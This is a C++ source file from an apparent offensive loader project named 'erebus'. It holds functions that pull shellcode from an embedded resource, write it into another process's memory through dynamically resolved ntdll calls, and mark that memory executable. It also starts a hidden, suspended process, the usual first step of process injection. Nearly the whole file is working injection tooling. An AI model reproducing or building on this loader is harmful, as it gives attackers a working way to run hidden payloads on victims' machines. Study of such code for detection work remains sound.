#include "../include/loader.hpp"

namespace erebus {
	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size)
	{
		BOOL success = FALSE;
		PVOID shellcode_address;

		HRSRC resource_handle = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), resource_class);
		if (!resource_handle)
		{
			LOG_ERROR("Failed to get resource handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		DWORD resource_size = SizeofResource(nullptr, resource_handle);

		HGLOBAL global_handle = LoadResource(nullptr, resource_handle);
		if (!global_handle)
		{
			LOG_ERROR("Failed to get global handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		PVOID resource_pointer = LockResource(global_handle);
		if (!resource_pointer)
		{
			LOG_ERROR("Failed to get resource pointer. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		shellcode_address = HeapAlloc(GetProcessHeap(), 0, resource_size);
		if (shellcode_address)
		{
			RtlCopyMemory(shellcode_address, resource_pointer, resource_size);
			success = TRUE;
		}

		*shellcode_size = (SIZE_T)resource_size;
		*shellcode = (BYTE*)shellcode_address;
		return success;
	}

	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size)
	{
		SIZE_T bytes_written = 0;
		PVOID base_address = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;
		SIZE_T allocation_size = shellcode_size;
		NTSTATUS status;

		// Validate input
		if (!shellcode || shellcode_size == 0)
		{
			LOG_ERROR("Invalid shellcode pointer or size");
			return NULL;
		}

		ntdll = ImportModule("ntdll.dll");
		ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);

		status = NtAllocateVirtualMemory(process_handle, &base_address, 0, &allocation_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to allocate memory space (NTSTATUS: 0x%08lX)", status);
			return NULL;
		}
		LOG_SUCCESS("Address Pointer: 0x%p", base_address);

		status = NtWriteVirtualMemory(process_handle, base_address, (PVOID)shellcode, shellcode_size, &bytes_written);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Error writing shellcode to memory (NTSTATUS: 0x%08lX). (Wrote %zu/%zu bytes)", status, bytes_written, shellcode_size);
			return NULL;
		}
		
		if (bytes_written != shellcode_size)
		{
			LOG_ERROR("Incomplete write: wrote %zu/%zu bytes", bytes_written, shellcode_size);
			return NULL;
		}

		LOG_SUCCESS("Shellcode written to memory (%zu bytes).", bytes_written);

		status = NtProtectVirtualMemory(process_handle, &base_address, &allocation_size, PAGE_EXECUTE_READ, &old_protection);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to change protection type (NTSTATUS: 0x%08lX)", status);
			return NULL;
		}

		LOG_SUCCESS("Protection changed to RX (was: 0x%lX).", old_protection);

		return base_address;
	}

	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
	{
		SIZE_T lpSize = 0;
		const DWORD attribute_count = 1;

		STARTUPINFOW startup_info = {};
		PROCESS_INFORMATION process_info = {};

		BOOL success = CreateProcessW(
			NULL,
			cmd,
			NULL,
			NULL,
			FALSE,
			(CREATE_NO_WINDOW | CREATE_SUSPENDED),
			NULL,
			NULL,
			&startup_info,
			&process_info);

		*process_handle = process_info.hProcess;
		*thread_handle = process_info.hThread;

		return success;
	}
} // namespace erebus
